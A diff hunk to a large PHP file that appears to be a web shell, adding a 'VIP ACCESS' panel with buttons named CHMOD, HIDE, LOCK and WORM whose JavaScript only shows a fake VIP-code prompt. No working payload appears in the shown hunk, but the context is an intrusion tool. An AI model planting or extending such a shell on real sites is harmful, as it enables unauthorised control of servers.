@@ -3588,6 +3588,44 @@ $target=$_SERVER['DOCUMENT_ROOT'];
 ?>
 <br><br><hr width="300">
 <?php
+} elseif($_GET['act'] == 'etcv') {
+?>
+<center><font color=gold><p>VIP ACCESS</p>
+
+		<button onclick="konfirmasiDulu()">CHMOD</button> <button onclick="konfirmasiDulu()">TIME</button> <button onclick="konfirmasiDulu()">HIDE</button> <button onclick="konfirmasiDulu()">LOCK</button> <button onclick="konfirmasiDulu()">WORM</button> <button onclick="konfirmasiDulu()">GUARD</button>
+
+		<p id="hasil"></p>
+
+		
+
+		<script>
+
+			function konfirmasiDulu(){
+
+				var konfirmasi = confirm("FITUR INI KHUSUS UNTUK VIP MEMBERS..!");
+
+				var text = "";
+
+				prompt("Harap masukkan kode VIP Anda..!");
+
+				if(konfirmasi === true) {
+
+					text = "<font color=red>KODE SALAH..!";
+
+				}else{
+
+					text = "<font color=cyan>Silahkan gunakan fitur lain... :)";
+
+				}
+
+				
+
+				document.getElementById("hasil").innerHTML = text;
+
+			}
+
+		</script></center>
+<?php
 } elseif($_GET['go'] == 'vips') {
 ?>
 	<center><br><table><td style='background-color: transparent;text-align:center;border: 2px blue 
